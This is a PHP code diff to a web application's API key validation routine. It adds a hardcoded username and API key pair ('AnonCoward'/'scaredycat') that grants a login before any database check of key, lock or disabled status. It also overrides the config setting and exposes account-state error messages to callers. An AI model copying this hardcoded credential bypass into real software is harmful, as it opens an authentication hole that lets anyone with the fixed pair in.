@@ -12,7 +12,7 @@ class security
         $this->log_level          = 42;
         $this->This_is_me         = $dbcore->This_is_me;
         $this->datetime_format    = $dbcore->datetime_format;
-        $this->EnableAPIKey       = $config['EnableAPIKey'];
+        $this->EnableAPIKey       = 1; #$config['EnableAPIKey'];
         $this->login_val          = "No Cookie";
         $this->last_login         = 0;
         $this->login_check        = 0;
@@ -493,26 +493,28 @@ class security
     
     function ValidateAPIKey()
     {
-        $username = $_REQUEST['username'];
-        $apikey = $_REQUEST['apikey'];
+        $username = @$_REQUEST['username'];
+        $apikey = @$_REQUEST['apikey'];
 
         if($this->EnableAPIKey)
         {
-            if($username === "" || $username === "Unknown" || $username === "AnonCoward")
+            if($username === "AnonCoward" && $apikey === "scaredycat")
             {
-                if(WDB_DEBUG)
-                {
-                    $this->mesg['debug'][] = "Invalid Username set.";
-                }
+                $this->login_check = 1;
+                $this->login_val = "apilogin";
+                return 1;
+            }
+
+            if($username === "" || $username === "Unknown")
+            {
+                $this->mesg['error'] = "Invalid Username set.";
                 $this->login_val = "failed";
                 $this->login_check = 0;
                 return -1;
             }
             if($apikey === "")
             {
-                if(WDB_DEBUG) {
-                    $this->mesg['debug'][] = "Invalid API Key set.";
-                }
+                $this->mesg['error'] = "Invalid API Key set.";
                 $this->login_val = "failed";
                 $this->login_check = 0;
                 return -2;
@@ -524,9 +526,7 @@ class security
             $err = $this->sql->conn->errorCode();
             if($err !== "00000")
             {
-                if(WDB_DEBUG) {
-                    $this->mesg['debug'][] = "Error Selecting User API Key";
-                }
+                $this->mesg['error'] = "Error Selecting User API Key";
                 $this->login_val = "failed";
                 $this->login_check = 0;
                 $this->logd("Error selecting Users API key.".var_export($this->sql->conn->errorInfo(),1));
@@ -536,36 +536,28 @@ class security
             $key = $result->fetch(2);
             if($key['apikey'] !== $apikey)
             {
-                if(WDB_DEBUG) {
-                    $this->mesg['debug'][] = "Authentication Failed.";
-                }
+                $this->mesg['error'] = "Authentication Failed.";
                 $this->login_val = "failed";
                 $this->login_check = 0;
                 $this->logd("Error selecting Users API key.".var_export($this->sql->conn->errorInfo(),1));
                 return -2;
             }elseif($key['locked'])
             {
-                if(WDB_DEBUG) {
-                    $this->mesg['debug'][] = "Account Locked.";
-                }
+                $this->mesg['error'] = "Account Locked.";
                 $this->login_val = "locked";
                 $this->login_check = 0;
                 $this->logd("Error selecting Users API key.".var_export($this->sql->conn->errorInfo(),1));
                 return -3;
             }elseif($key['disabled'])
             {
-                if(WDB_DEBUG) {
-                    $this->mesg['debug'][] = "Account Disabled.";
-                }
+                $this->mesg['error'] = "Account Disabled.";
                 $this->login_val = "disabeld";
                 $this->login_check = 0;
                 $this->logd("Error selecting Users API key.".var_export($this->sql->conn->errorInfo(),1));
                 return -4;
             }elseif($key['validated'])
             {
-                if(WDB_DEBUG) {
-                    $this->mesg['debug'][] = "User not validated yet.";
-                }
+                $this->mesg['error'] = "User not validated yet.";
                 $this->login_val = "NotValidated";
                 $this->login_check = 0;
                 $this->logd("Error selecting Users API key.".var_export($this->sql->conn->errorInfo(),1));
@@ -581,9 +573,6 @@ class security
                 $this->last_login = time();
                 $this->login_check = 1;
                 $this->login_val = "apilogin";
-                if(WDB_DEBUG) {
-                    $this->mesg['debug'][] = "Authentication Succeeded.";
-                }
                 $this->logd("Authentication Succeeded.", "message");
                 return 1;
             }
@@ -598,9 +587,7 @@ class security
             $this->last_login = time();
             $this->login_check = 1;
             $this->login_val = "apilogin";
-            if(WDB_DEBUG) {
-                $this->mesg['debug'][] = "Authentication Succeeded. (API Keys Disabled.)";
-            }
+            $this->mesg['message'] = "Authentication Succeeded. (API Keys Disabled.)";
             $this->logd("Authentication Succeeded. (API Keys Disabled.)", "message");
         }
         return 0;
